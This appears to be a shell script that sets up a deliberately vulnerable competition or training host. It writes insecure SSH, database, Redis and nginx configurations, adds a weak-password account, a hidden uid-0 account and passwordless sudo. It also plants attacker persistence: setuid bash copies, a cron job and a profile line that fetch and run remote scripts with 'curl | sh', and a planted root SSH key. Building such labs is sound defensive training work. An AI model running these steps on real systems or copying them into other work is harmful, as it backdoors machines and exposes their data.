#!/bin/sh
# One host, wrong in every way a competition box usually is.
#
# Nothing here is exotic. Each of these is what you get from an install nobody
# went back to, plus the traces of somebody who found it that way first.
set -eu

# --- SSH, for logging in --------------------------------------------------
# The lab has to stay reachable, so root login and passwords stay on. This is
# also, deliberately, exactly what the baseline checks flag.
cat > /etc/ssh/sshd_config <<'EOF'
Port 22
HostKey /etc/ssh/ssh_host_rsa_key
HostKey /etc/ssh/ssh_host_ecdsa_key
HostKey /etc/ssh/ssh_host_ed25519_key
Subsystem sftp /usr/lib/openssh/sftp-server

# root logs in with a password, and the packaged default sits underneath where
# a reader that strips comment markers will pick it up instead. That mistake
# reported this host as compliant once; this line is why it cannot again.
PermitRootLogin yes
#PermitRootLogin prohibit-password

PasswordAuthentication yes
#PasswordAuthentication no

PermitEmptyPasswords yes
PubkeyAuthentication no
X11Forwarding yes
AllowTcpForwarding yes
MaxAuthTries 10
LoginGraceTime 600
ClientAliveInterval 0
ClientAliveCountMax 10
IgnoreRhosts no
HostbasedAuthentication yes
UsePAM no
EOF

# --- The other five baseline files ---------------------------------------
cat > /etc/login.defs <<'EOF'
MAIL_DIR        /var/mail
FAIL_DELAY      0
PASS_MAX_DAYS   99999
PASS_MIN_DAYS   0
PASS_WARN_AGE   0
UMASK           022
ENCRYPT_METHOD  MD5
SHA_CRYPT_MIN_ROUNDS 1000
UID_MIN         1000
GID_MIN         1000
EOF

mkdir -p /etc/security /etc/audit /etc/sysctl.d

cat > /etc/security/faillock.conf <<'EOF'
deny = 0
unlock_time = 0
fail_interval = 60
EOF

cat > /etc/security/pwquality.conf <<'EOF'
minlen = 4
# minlen = 12
dcredit = 0
ucredit = 0
EOF

cat > /etc/audit/auditd.conf <<'EOF'
log_file = /var/log/audit/audit.log
max_log_file = 1
num_logs = 1
max_log_file_action = IGNORE
space_left_action = IGNORE
admin_space_left_action = IGNORE
disk_full_action = IGNORE
EOF

cat > /etc/sysctl.d/99-lovelyres-baseline.conf <<'EOF'
net.ipv4.conf.all.accept_redirects = 1
net.ipv4.conf.default.accept_redirects = 1
net.ipv4.conf.all.send_redirects = 1
net.ipv4.conf.all.accept_source_route = 1
net.ipv4.conf.default.accept_source_route = 1
net.ipv4.conf.all.rp_filter = 0
net.ipv4.conf.default.rp_filter = 0
net.ipv4.icmp_echo_ignore_broadcasts = 0
net.ipv4.tcp_syncookies = 0
net.ipv4.ip_forward = 1
net.ipv6.conf.all.accept_redirects = 1
net.ipv6.conf.default.accept_redirects = 1
kernel.randomize_va_space = 0
fs.suid_dumpable = 2
EOF

# --- nginx ----------------------------------------------------------------
cat > /etc/nginx/nginx.conf <<'EOF'
user www-data;
worker_processes auto;
pid /run/nginx.pid;
error_log /var/log/nginx/error.log warn;

events { worker_connections 1024; }

http {
    include /etc/nginx/mime.types;
    default_type application/octet-stream;
    access_log /var/log/nginx/access.log;

    # The banner names the exact build being run.
    server_tokens on;

    # No ceiling on an upload and no timeout worth the name.
    client_max_body_size 0;
    client_body_timeout 3600s;
    send_timeout 3600s;

    # Obsolete protocols, and a cipher list that allows them.
    ssl_protocols SSLv3 TLSv1 TLSv1.1 TLSv1.2;
    ssl_ciphers ALL:!aNULL:!eNULL;
    ssl_prefer_server_ciphers off;

    include /etc/nginx/conf.d/*.conf;
}
EOF

rm -f /etc/nginx/sites-enabled/default
mkdir -p /etc/nginx/conf.d /var/www/html/uploads
cat > /etc/nginx/conf.d/site.conf <<'EOF'
server {
    listen 0.0.0.0:80;
    server_name _;

    root /var/www/html;
    index index.html;

    # Directory listing over the whole document root.
    autoindex on;
    autoindex_exact_size on;

    # A world-writable upload directory that is served straight back.
    location /uploads/ { autoindex on; }

    # Runtime status with no access control at all.
    location /nginx_status {
        stub_status on;
        access_log off;
    }

    # And the source tree, by accident.
    location /.git { autoindex on; }
}
EOF
printf '<h1>arena</h1>\n' > /var/www/html/index.html
mkdir -p /var/www/html/.git
printf '[core]\n\trepositoryformatversion = 0\n' > /var/www/html/.git/config
chmod 0777 /var/www/html/uploads

# --- MariaDB --------------------------------------------------------------
mkdir -p /etc/mysql/mariadb.conf.d
cat > /etc/mysql/mariadb.conf.d/99-lab.cnf <<'EOF'
[mysqld]
# Reachable from anywhere.
bind-address = 0.0.0.0
skip-networking = 0

# Local file reads are on and unbounded, so a SQL injection reads /etc/passwd.
local_infile = 1
secure_file_priv =

# Nothing is recorded.
general_log = 0
slow_query_log = 0

# Transport is not encrypted.
ssl = 0
require_secure_transport = OFF

symbolic-links = 1
max_connections = 100000
max_allowed_packet = 1G
EOF

# --- Redis ----------------------------------------------------------------
cat > /etc/redis/redis.conf <<'EOF'
# No password, reachable from anywhere, and the safety net that would refuse
# such connections switched off. This is the single most-exploited service
# configuration there is.
bind 0.0.0.0
protected-mode no
port 6379
daemonize no
supervised no
pidfile /run/redis/redis-server.pid
loglevel notice
logfile /var/log/redis/redis-server.log
dir /var/lib/redis
dbfilename dump.rdb
databases 16
save 900 1
appendonly no
maxmemory 0
EOF

# --- PostgreSQL -----------------------------------------------------------
PG=$(ls -1d /etc/postgresql/*/main 2>/dev/null | head -n 1)
if [ -n "$PG" ]; then
  cat >> "$PG/postgresql.conf" <<'EOF'

# --- lab: everything below is deliberately wrong -----------------------------
listen_addresses = '*'
ssl = off
password_encryption = md5
logging_collector = off
log_connections = off
log_disconnections = off
log_statement = 'none'
log_min_duration_statement = -1
fsync = off
synchronous_commit = off
EOF
  cat > "$PG/pg_hba.conf" <<'EOF'
# TYPE  DATABASE  USER  ADDRESS       METHOD
local   all       all                 trust
host    all       all   0.0.0.0/0     trust
host    all       all   ::/0          trust
EOF
fi

# --- Accounts -------------------------------------------------------------
useradd -m -s /bin/bash operator 2>/dev/null || true
printf 'operator:123456\n' | chpasswd 2>/dev/null || true
chage -M 99999 -m 0 -W 0 operator 2>/dev/null || true
# A second account with uid 0, which is a root account wearing another name.
useradd -o -u 0 -g 0 -M -s /bin/bash backupsvc 2>/dev/null || true
printf 'backupsvc:backup\n' | chpasswd 2>/dev/null || true
echo 'operator ALL=(ALL) NOPASSWD:ALL' > /etc/sudoers.d/90-operator
chmod 0440 /etc/sudoers.d/90-operator

# --- What somebody who got here first left behind -------------------------
mkdir -p /usr/local/lib/pyshared /var/tmp/... /dev/shm
printf '#!/bin/sh\n# left by whoever found this box first\nexit 0\n' > /usr/local/lib/pyshared/.helper
chmod 4755 /usr/local/lib/pyshared/.helper
cp /bin/bash /usr/local/bin/.sysd 2>/dev/null || true
chmod 4755 /usr/local/bin/.sysd 2>/dev/null || true

printf '#!/bin/sh\n(curl -fsSL --connect-timeout 1 --max-time 2 http://198.51.100.7/p.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1\n' > /etc/cron.daily/logrotate-helper
chmod 0755 /etc/cron.daily/logrotate-helper
printf '*/5 * * * * root /usr/local/lib/pyshared/.helper >/dev/null 2>&1\n' > /etc/cron.d/sysupdate
chmod 0644 /etc/cron.d/sysupdate

printf '\n# added by nobody\n(curl -fsSL --connect-timeout 1 --max-time 2 http://198.51.100.7/b.sh 2>/dev/null | sh &) </dev/null >/dev/null 2>&1\n' >> /etc/profile

mkdir -p /root/.ssh
printf 'ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDlabplantedkeyplantedkeyplantedkey attacker@elsewhere\n' > /root/.ssh/authorized_keys
chmod 0600 /root/.ssh/authorized_keys

# History that says what was done, and history that was wiped.
printf 'wget http://198.51.100.7/p.sh\nchmod +x p.sh\n./p.sh\nhistory -c\n' > /root/.bash_history
: > /home/operator/.bash_history 2>/dev/null || true

printf 'arena prepared\n'
